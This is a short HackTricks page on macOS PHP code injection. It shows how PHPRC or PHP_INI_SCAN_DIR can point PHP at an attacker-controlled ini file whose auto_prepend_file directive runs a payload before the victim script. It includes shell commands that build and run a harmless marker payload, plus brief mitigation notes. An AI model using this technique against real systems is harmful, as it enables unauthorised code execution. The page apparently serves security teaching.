---
title: "macOS PHP Applications Injection"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-php-applications-injection.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: misc
---

## `PHPRC` / `PHP_INI_SCAN_DIR` and `auto_prepend_file`

`PHPRC` / `PHP_INI_SCAN_DIR` and `auto_prepend_file`
PHP CLI and CGI read configuration on every invocation. `PHPRC` can select an attacker-readable `php.ini`, while `PHP_INI_SCAN_DIR` can redirect the directory scanned for additional `.ini` files. The `auto_prepend_file` directive makes PHP parse a file before the requested script, so this combination becomes startup code execution.[\[1\]](#references)[\[2\]](#references)

```
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini
PHPRC=/tmp/attacker-php.ini php victim.php
```
An alternative is a directory containing an `.ini` file:

```
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```
The `-n` option ignores `php.ini`; an explicit trusted `-c` path takes precedence over `PHPRC`. Remember that a long-lived server SAPI normally reads configuration when the web server starts, whereas CLI and CGI do so per invocation.[\[1\]](#references)

## References
